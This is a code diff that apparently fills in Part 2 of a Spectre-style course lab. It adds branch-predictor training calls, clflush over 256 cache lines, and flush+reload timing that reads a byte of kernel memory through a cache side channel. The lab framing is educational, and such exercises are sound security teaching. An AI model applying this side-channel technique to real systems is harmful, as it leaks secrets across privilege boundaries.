@@ -47,6 +47,22 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // [Part 2]- Fill this in!
         // leaked_byte = ??
+	
+	for(int i = 0; i < 2; i++) {
+		call_kernel_part2(kernel_fd, shared_memory, 1);
+	}
+	        for(int i = 0; i < 256; i++) {
+                clflush(&shared_memory[i*4096]);
+        }
+        call_kernel_part2(kernel_fd, shared_memory, current_offset);
+
+        for(int i = 0; i < 256; i++) {
+                volatile uint64_t time = time_access((void*)&shared_memory[i*4096]);
+                if(time < 190) {
+                        printf("%d, %ld, %ld\n", i, time, current_offset);
+                        leaked_byte = i;
+                }
+        }
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
